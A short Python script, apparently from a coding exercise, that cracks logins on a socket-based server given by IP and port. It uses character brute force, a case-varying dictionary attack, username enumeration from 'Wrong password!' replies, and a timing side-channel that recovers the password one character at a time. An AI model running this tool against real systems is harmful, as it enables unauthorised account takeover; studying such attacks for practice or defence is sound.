import sys
import socket
import itertools
import json
import string
from datetime import datetime


def main():
    # brute_force()
    # dictionary_based_brute_force()
    catching_exception()


def catching_exception():
    with socket.socket() as sock:
        ip, port = sys.argv[-2], int(sys.argv[-1])
        sock.connect((ip, port))
        with open("logins.txt") as logins:
            for x in logins.readlines():
                result = generate_by_dict(sock, x.rstrip(), "log")
                if bool(result) is not False:
                    print(json.dumps(password_guessing(sock, result)))
                    break


def password_guessing(sock, result):
    password = ""
    while True:
        result["password"] = password
        for i in string.ascii_letters + string.digits + string.punctuation:
            result["password"] += i
            sock.send(json.dumps(result).encode())
            time_before = datetime.now()
            response = json.loads(sock.recv(1024).decode())["result"]
            time_after = datetime.now()
            if response == "Connection success!":
                result["password"] = password + i
                return result
            if (time_after - time_before).microseconds >= 100000:
                password += i
                break
            result["password"] = password


def dictionary_based_brute_force():
    with socket.socket() as sock:
        ip, port = sys.argv[-2], int(sys.argv[-1])
        sock.connect((ip, port))
        with open("passwords.txt") as password:
            for x in password.readlines():
                result = generate_by_dict(sock, x.rstrip(), "pass")
                if bool(result) is not False:
                    print(result)
                    break


def generate_by_dict(sock, x, act):
    while True:
        if not x.isdigit():
            for y in itertools.product(*([letter.lower(), letter.upper()] for letter in x)):
                if act == "pass":
                    sock.send("".join(y).encode())
                    if sock.recv(1024).decode() == "Connection success!":
                        return ''.join(y)
                elif act == "log":
                    info = {"login": "".join(y), "password": " "}
                    sock.send(json.dumps(info).encode())
                    if json.loads(sock.recv(1024).decode())["result"] == "Wrong password!":
                        return info
        return False


def brute_force():
    with socket.socket() as sock:
        ip, port = sys.argv[-2], int(sys.argv[-1])
        sock.connect((ip, port))
        for x in generate_password():
            sock.send(''.join(x).encode())
            if sock.recv(1024).decode() == "Connection success!":
                print(''.join(x))
                break


def generate_password():
    index = 1
    while True:
        symbols = "abcdefghijklmnopqrstuvwxyz1234567890"
        yield from itertools.product(symbols, repeat=index)
        index += 1


if __name__ == "__main__":
    main()
